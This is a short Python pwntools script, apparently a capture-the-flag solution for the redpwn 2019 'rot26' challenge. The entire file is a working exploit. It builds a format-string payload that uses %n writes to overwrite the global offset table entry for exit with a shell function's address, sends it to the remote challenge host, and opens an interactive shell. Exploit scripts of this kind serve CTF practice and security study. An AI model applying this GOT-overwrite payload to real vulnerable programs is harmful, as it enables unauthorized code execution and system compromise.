from pwn import *

p = process("rot26")
p = remote("chall2.2019.redpwn.net", 4003)

shell = 0x8048737
exitplt = 0x804a020

# At each step check the global offset table!!!!
exploit = ''
exploit += p32(exitplt)
exploit += p32(exitplt+2)
exploit += '%34607x'
exploit += "%7$n"
exploit += '%32973x'
exploit += "%8$n"

# print exploit

p.sendline(exploit)
p.interactive()
